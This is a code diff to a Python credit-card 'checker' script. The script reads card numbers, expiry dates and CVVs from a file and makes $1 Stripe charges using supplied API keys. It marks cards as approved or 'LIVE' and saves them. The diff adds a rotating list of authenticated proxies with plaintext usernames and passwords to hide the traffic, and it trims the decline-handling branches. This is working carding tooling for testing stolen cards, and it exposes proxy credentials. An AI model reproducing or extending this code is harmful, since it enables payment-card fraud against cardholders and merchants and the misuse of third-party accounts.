@@ -3,12 +3,20 @@ import re
 import requests
 import json
 import aiohttp
+import random
 
 # Constants
 AMOUNT = 4
 CARD_PATTERN = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")
 CC_FILE = 'cc.txt'
 APPROVE_FILE = 'approve.txt'
+
+# Proxy list
+proxy_list = [
+    "us9.cactussstp.com:3129:akoitwja:x9b2wc76QW",
+    "65.181.166.79:62128:cuvulyls:ujs1642NqY",
+    "prox-lu.pointtoserver.com:10799:purevpn0s3978104:hk6vchvcmyah",
+]
 
 async def get_bin_info(bin_number):
     url = f"https://bins.antipublic.cc/bins/{bin_number}"
@@ -42,6 +50,14 @@ def process_card(card_info, sk, pk):
     if not all([cc, mes, ano, cvv]):
         return f"❌ Invalid card details for `{card_info}`"
 
+    # Select a random proxy
+    selected_proxy = random.choice(proxy_list)
+    proxy_ip, proxy_port, proxy_user, proxy_pass = selected_proxy.split(':')
+    proxies = {
+        "http": f"http://{proxy_user}:{proxy_pass}@{proxy_ip}:{proxy_port}",
+        "https": f"https://{proxy_user}:{proxy_pass}@{proxy_ip}:{proxy_port}",
+    }
+
     token_data = {
         'type': 'card',
         "card[number]": cc,
@@ -58,6 +74,7 @@ def process_card(card_info, sk, pk):
                 "Authorization": f"Bearer {pk}",
                 "Content-Type": "application/x-www-form-urlencoded",
             },
+            proxies=proxies  # Use the random proxy here
         )
     except requests.RequestException as e:
         return f"❌ Error with card `{cc}`: {str(e)}"
@@ -94,6 +111,7 @@ def process_card(card_info, sk, pk):
                 "Authorization": f"Bearer {sk}",
                 "Content-Type": "application/x-www-form-urlencoded",
             },
+            proxies=proxies  # Use the random proxy here as well
         )
     except requests.RequestException as e:
         return f"❌ Charge error for `{cc}`: {str(e)}"
@@ -108,7 +126,6 @@ def process_card(card_info, sk, pk):
         charge_error = "Unknown error (Invalid JSON response)"
         charge_message = "No message available"
 
-    # Updated section with all responses
     if '"status": "succeeded"' in charges:
         status = "Approved ✅"
         resp = "Charged 1$🔥"
@@ -124,63 +141,9 @@ def process_card(card_info, sk, pk):
         status = "LIVE ✅"
         resp = "Insufficient funds 💰"
         save_approved_card(card_info, resp)
-    elif "fraudulent" in charges:
-        status = "Declined ❌"
-        resp = "Fraudulent"
-    elif "do_not_honor" in charges:
-        status = "Declined ❌"
-        resp = "Do Not Honor"
-    elif '"code": "incorrect_cvc"' in charges:
-        status = "LIVE ✅"
-        resp = "Security code (CVC) is Incorrect."
-    elif "invalid_expiry_month" in charges:
-        status = "Declined ❌"
-        resp = "The card expiration date provided is invalid."
-    elif "invalid_account" in charges:
-        status = "Declined ❌"
-        resp = "The account linked to the card is invalid."
-    elif "lost_card" in charges:
-        status = "Declined ❌"
-        resp = "The card has been reported as lost and the transaction was declined."
-    elif "stolen_card" in charges:
-        status = "Declined ❌"
-        resp = "The card has been reported as stolen and the transaction was declined."
-    elif "transaction_not_allowed" in charges:
-        status = "CCN LIVE ✅"
-        resp = "Transaction Not Allowed"
-    elif "authentication_required" in charges or "card_error_authentication_required" in charges:
-        status = "LIVE ✅"
-        resp = "3D Secured"
-    elif "pickup_card" in charges:
-        status = "Declined ❌"
-        resp = "Pickup Card"
-    elif "Your card has expired." in charges:
-        status = "Declined ❌"
-        resp = "Expired Card"
-    elif "card_decline_rate_limit_exceeded" in charges:
-        status = "Declined ❌"
-        resp = "Rate limit"
-    elif '"code": "processing_error"' in charges:
-        status = "Declined ❌"
-        resp = "Processing error"
-    elif '"message": "Your card number is incorrect."' in charges:
-        status = "Declined ❌"
-        resp = "Your card number is incorrect."
-    elif "incorrect_number" in charges:
-        status = "Declined ❌"
-        resp = "Card number is invalid."
-    elif "testmode_charges_only" in charges:
-        status = "Declined ❌"
-        resp = "The SK key is in test mode or invalid. Please use a valid key."
-    elif "api_key_expired" in charges:
-        status = "Declined ❌"
-        resp = "The API key used for the transaction has expired."
-    elif "parameter_invalid_empty" in charges:
-        status = "Declined ❌"
-        resp = "Please enter valid card details to check."
     else:
-        status = f"{charge_error}"
-        resp = f"{charge_message}"
+        status = charge_error
+        resp = charge_message
 
     return f"{status}\n\n𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}"
 
@@ -207,4 +170,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-                    
+    
